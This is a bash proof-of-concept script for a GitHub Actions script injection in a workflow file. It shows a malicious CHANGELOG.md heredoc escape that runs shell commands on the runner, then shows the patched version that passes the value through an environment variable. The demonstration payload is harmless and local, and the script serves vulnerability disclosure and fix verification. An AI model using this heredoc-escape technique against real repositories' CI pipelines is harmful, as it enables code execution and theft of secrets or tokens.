#!/bin/bash
# POC: GitHub Actions Script Injection via CHANGELOG.md heredoc escape
#
# This script demonstrates a script injection vulnerability in
# .github/workflows/sanitize.yml (before fix).
#
# VULNERABILITY SUMMARY:
#   The changelog-format job in sanitize.yml reads CHANGELOG.md using
#   mindsers/changelog-reader-action and directly interpolates the multi-line
#   `changes` output into a shell `run:` block via:
#     ${{ steps.changelog_reader.outputs.changes }}
#
#   Because the workflow triggers on `pull_request`, an attacker can craft a
#   CHANGELOG.md in their PR that escapes the heredoc delimiter and executes
#   arbitrary shell commands on the GitHub Actions runner.
#
# ATTACK CHAIN:
#   1. Attacker forks the repo
#   2. Modifies mla/CHANGELOG.md (or mlar/CHANGELOG.md) with a payload
#      (see malicious_changelog.md for example)
#   3. Opens a PR -> triggers `pull_request` event on sanitize.yml
#   4. actions/checkout checks out the attacker's PR code
#   5. changelog-reader-action parses the malicious CHANGELOG.md
#   6. The `changes` output contains a heredoc escape sequence
#   7. The Information step's run: block receives injected shell commands
#   8. Arbitrary code executes on the GitHub runner (with contents:read permissions)
#
# USAGE:
#   ./poc.sh
#
# EXPECTED OUTPUT:
#   - The VULNERABLE version creates /tmp/poc_sanitize_rce/pwned.txt (RCE)
#   - The FIXED version treats the payload as plain text (no RCE)

set -euo pipefail

POC_DIR="/tmp/poc_sanitize_rce"
mkdir -p "$POC_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
NC='\033[0m'

echo ""
echo "============================================================"
echo -e "${BOLD}POC: GitHub Actions Script Injection in sanitize.yml${NC}"
echo "============================================================"
echo ""

# ---------------------------------------------------------------
# Simulate changelog-reader-action's parsing of a malicious CHANGELOG.
#
# The action (src/parse-entry.js) extracts:
#   - version: from header via /[a-zA-Z0-9.\-+]+/ (safe chars only)
#   - status:  computed as released/unreleased/prereleased/yanked
#   - changes: the multi-line body text (arbitrary content!)
#
# The `changes` output is set verbatim via core.setOutput('changes', entry.text)
# with newlines preserved. No sanitization is applied.
# ---------------------------------------------------------------

# This simulates what changelog-reader-action would output for the
# `changes` field when parsing a malicious CHANGELOG.md entry.
# The payload contains:
#   1. A line that is just "EOF" to terminate the cat heredoc
#   2. A shell command (harmless id > file for demonstration)
#   3. A new "cat << 'EOF'" to consume the remaining heredoc delimiter
SIMULATED_CHANGES=$(cat << 'PARSEEOF'

### Added

- Totally legitimate looking feature
EOF
echo "RCE_MARKER: Command execution achieved - $(id)" > /tmp/poc_sanitize_rce/pwned.txt
cat << 'EOF'
- Another legitimate looking feature
PARSEEOF
)

SIMULATED_VERSION="99.0.0"
SIMULATED_STATUS="released"

echo -e "${BOLD}1. Simulated changelog-reader-action outputs:${NC}"
echo "   version = $SIMULATED_VERSION"
echo "   status  = $SIMULATED_STATUS"
echo "   changes = (multi-line, contains heredoc escape payload)"
echo ""

# ---------------------------------------------------------------
# VULNERABLE VERSION (original sanitize.yml before fix)
# ---------------------------------------------------------------
echo "============================================================"
echo -e "${RED}${BOLD}2. VULNERABLE VERSION (original sanitize.yml)${NC}"
echo "============================================================"
echo ""
echo "The original workflow step used direct \${{ }} interpolation"
echo "in the shell run: block:"
echo ""
echo '    cat << '"'"'EOF'"'"
echo '    ${{ steps.changelog_reader.outputs.changes }}'
echo '    EOF'
echo ""
echo -e "${YELLOW}GitHub Actions expands \${{ }} BEFORE the shell runs.${NC}"
echo -e "${YELLOW}The attacker's 'EOF' line terminates the heredoc early,${NC}"
echo -e "${YELLOW}and subsequent lines execute as shell commands.${NC}"
echo ""

# Build the script exactly as GitHub Actions would after expression expansion
VULN_SCRIPT=$(cat << SCRIPTEOF
echo -e "\e[1mVersion\e[0m ${SIMULATED_VERSION}"
echo -e "\e[1mStatus\e[0m ${SIMULATED_STATUS}"
echo -en "\e[1mBody\e[0m"
cat << 'EOF'
${SIMULATED_CHANGES}
EOF
SCRIPTEOF
)

echo "--- expanded script (what the shell receives) ---"
echo "$VULN_SCRIPT"
echo "--- end ---"
echo ""

rm -f "$POC_DIR/pwned.txt"

echo -e "${BOLD}Executing...${NC}"
echo ""
bash -c "$VULN_SCRIPT" 2>&1 || true
echo ""

if [ -f "$POC_DIR/pwned.txt" ]; then
    echo -e "${RED}${BOLD}[!] RCE CONFIRMED - $POC_DIR/pwned.txt created:${NC}"
    echo -e "${RED}    $(cat "$POC_DIR/pwned.txt")${NC}"
    echo ""
    echo -e "${RED}    VERDICT: TRUE POSITIVE — the vulnerability is real.${NC}"
else
    echo -e "${GREEN}[✓] No RCE detected${NC}"
fi
echo ""

# ---------------------------------------------------------------
# FIXED VERSION (patched sanitize.yml)
# ---------------------------------------------------------------
echo "============================================================"
echo -e "${GREEN}${BOLD}3. FIXED VERSION (patched sanitize.yml)${NC}"
echo "============================================================"
echo ""
echo "The fix moves values to env: block, referencing as shell vars:"
echo ""
echo '    env:'
echo '      CL_CHANGES: ${{ steps.changelog_reader.outputs.changes }}'
echo '    run: |'
echo '        echo "${CL_CHANGES}"'
echo ""
echo -e "${YELLOW}Environment variables are passed as DATA, not CODE.${NC}"
echo ""

rm -f "$POC_DIR/pwned.txt"

export CL_VERSION="$SIMULATED_VERSION"
export CL_STATUS="$SIMULATED_STATUS"
export CL_CHANGES="$SIMULATED_CHANGES"

echo -e "${BOLD}Executing...${NC}"
echo ""
bash -c '
echo -e "\e[1mVersion\e[0m ${CL_VERSION}"
echo -e "\e[1mStatus\e[0m ${CL_STATUS}"
echo -en "\e[1mBody\e[0m "
echo "${CL_CHANGES}"
' 2>&1 || true
echo ""

if [ -f "$POC_DIR/pwned.txt" ]; then
    echo -e "${RED}[!] RCE detected even after fix!${NC}"
    FIXED=false
else
    echo -e "${GREEN}${BOLD}[✓] No RCE — payload treated as plain text. Fix works.${NC}"
    FIXED=true
fi
echo ""

# ---------------------------------------------------------------
# Summary
# ---------------------------------------------------------------
echo "============================================================"
echo -e "${BOLD}SUMMARY${NC}"
echo "============================================================"
echo ""
echo "File:    .github/workflows/sanitize.yml"
echo "Job:     changelog-format"
echo "Step:    Information"
echo "Trigger: pull_request (runs on ANY PR, including from forks)"
echo ""
echo "Vector:  An attacker modifies CHANGELOG.md in a PR to include"
echo "         a heredoc escape (a line containing just 'EOF') followed"
echo "         by arbitrary shell commands."
echo ""
echo "Impact:  Arbitrary code execution on the GitHub Actions runner"
echo "         with the workflow's permissions (contents:read)."
echo "         Could exfiltrate source code, secrets, or GITHUB_TOKEN."
echo ""
echo "Fix:     Move \${{ }} expressions from run: to env: block."
echo "         Environment variables are safely passed as data."
echo ""
echo "Analysis of changelog-reader-action v2.2.3 outputs:"
echo "  version: /[a-zA-Z0-9.\\-+]+/ regex — safe chars only, NOT exploitable"
echo "  status:  fixed strings — NOT exploitable"
echo "  changes: arbitrary multi-line text — EXPLOITABLE via heredoc escape"
echo ""

# Cleanup
rm -rf "$POC_DIR"
